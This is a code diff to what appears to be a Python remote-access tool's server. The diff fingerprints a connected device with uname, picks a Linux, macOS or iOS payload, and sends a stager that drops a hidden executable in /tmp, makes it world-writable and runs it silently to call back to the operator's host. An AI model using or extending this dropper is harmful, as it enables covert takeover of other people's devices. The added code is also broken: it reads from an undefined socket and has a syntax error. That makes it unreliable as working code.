@@ -33,17 +33,25 @@ def callback(in_data, frame_count, time_info, status):
     unicorn.send(in_data)
     return (None, pyaudio.paContinue)
 
-def craft_payload(LHOST, LPORT):
-    print(G+"Sending payload...")
-    f = open("data/payload/magic_unicorn.py", "rb")
-    payload = f.read()
-    f.close()
-    instructions = \
-    "cat >/tmp/.magic_unicorn;"+\
-    "chmod 777 /tmp/.magic_unicorn;"+\
-    "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
-    print(G+"Executing payload...")
-    return (instructions,payload)
+def craft_payload(LHOST, LPORT, target_system):
+    if target_system in ["Linux", "macOS", "iOS"]:
+        print(G+"Sending "+target_system+" payload...")
+        if os.path.exists("data/payload/"+target_system+"/magic_unicorn.py"):
+            f = open("data/payload/"+target_system+"/magic_unicorn.py", "rb")
+            payload = f.read()
+            f.close()
+            instructions = \
+            "cat >/tmp/.magic_unicorn;"+\
+            "chmod 777 /tmp/.magic_unicorn;"+\
+            "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
+            print(G+"Executing "+target_system+" payload...")
+            return (instructions, payload)
+        else:
+            print(E+"Failed to craft "+target_system+" payload!")
+            sys.exit()
+    else:
+        print(E+"Unrecognized target system!")
+        sys.exit()
 
 class handler:
     def __init__(self,sock):
@@ -319,8 +327,22 @@ def server(LHOST, LPORT, handler=handler):
         c, a = s.accept()
         print(G + "Connecting to " + a[0] + "...")
 
-        bash_stager, executable = craft_payload(LHOST, LPORT)
-
+        c.send("uname -p")
+        device_arch = conn.recv(128).strip()
+        c.send("uname -s")
+        device_os = conn.recv(128).strip()
+        
+        if device_os == "Linux":
+            target_system = "Linux"
+        elif device_os == "Darwin" and device_arch == "i386":
+            target_system = "macOS"
+        elif device_os == "Darwin" and device_arch in ["arm64", "armv7s", "arm"]
+            target_system = "iOS"
+        else:
+            target_system = "Unknown"
+        
+        bash_stager, executable = craft_payload(LHOST, LPORT, target_system)
+        
         c.send(bash_stager.encode())
         c.send(executable)
         c.close()
